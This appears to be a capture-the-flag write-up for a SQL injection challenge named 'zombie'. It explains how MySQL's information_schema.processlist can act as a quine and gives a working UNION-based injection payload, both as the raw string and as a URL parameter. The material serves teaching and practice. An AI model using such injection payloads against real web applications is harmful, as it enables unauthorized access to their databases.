---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 31
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/619f9f68-e38d-47a0-a15b-ff662242c83b)

We are provided with the SQL query:

```sql
SELECT pw FROM prob_zombie WHERE pw='{$_GET[pw]}'
```

Similar to [ouroboros], in this challenge, we have to use a Quine in order to solve it.
However, since `ace` is being filtered out, we have to find another way of crafting our Quine.

&nbsp;

## `information_schema.processlist`

As noted by [this documentation](https://dev.mysql.com/doc/refman/8.4/en/information-schema-processlist-table.html), in MySQL, the `information_schema.processlist` is one source of process information which indicates the operations currently being performed by the set of threads executing within the server.

### `info` column

Within this table, the `info` column contains the statement that is being executed as show below.

![3](https://github.com/Kunull/Write-ups/assets/110326359/883c41a1-9cb1-4b55-98b3-641f02529310)

```sql
SELECT info FROM information_schema.processlist
```

Since the above query is being executed, the value present in the `info` column of `information_schema.processlist` would be:

```
+-------------------------------------------------+
| info                                            |
+-------------------------------------------------+
| SELECT info FROM information_schema.processlist |
+-------------------------------------------------+
```

As we can see, the SQL query outputs itself, thus acting as a Quine.

&nbsp;

## Modified Quine

```sql
1' UNION SELECT substr(info,locate('1',info),length(info)-locate('1',info)) FROM information_schema.processlist %23
```

- **`substr(info,locate('1',info),length(info)-locate('1',info))`**:
    - `locate('1', info)` finds the position of the first occurrence of the character `'1'` in the `info` column.
    - `length(info)` gives the total length of the `info` column's content.
    - `length(info)-locate('1',info)` calculates the length of the substring starting from the first occurrence of `'1'` to the end of the `info` content.
    - `substr(info, locate('1', info), length(info) - locate('1', info))` extracts this substring.
- **`from information_schema.processlist`**:   
    - This specifies the table from which the data is being selected. The `information_schema.processlist` table contains information about the currently running processes in the MySQL database server.

&nbsp;

If we provide the following URI parameter:

```
?pw=1' UNION SELECT substr(info,locate('1',info),length(info)-locate('1',info)) FROM information_schema.processlist %23
```

The resultant query becomes:

```sql
SELECT pw FROM prob_zombie WHERE pw='1' UNION SELECT substr(info,locate('1',info),length(info)-locate('1',info)) FROM information_schema.processlist #'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/606cc988-e99e-4db2-90fc-25387e44ccc7)
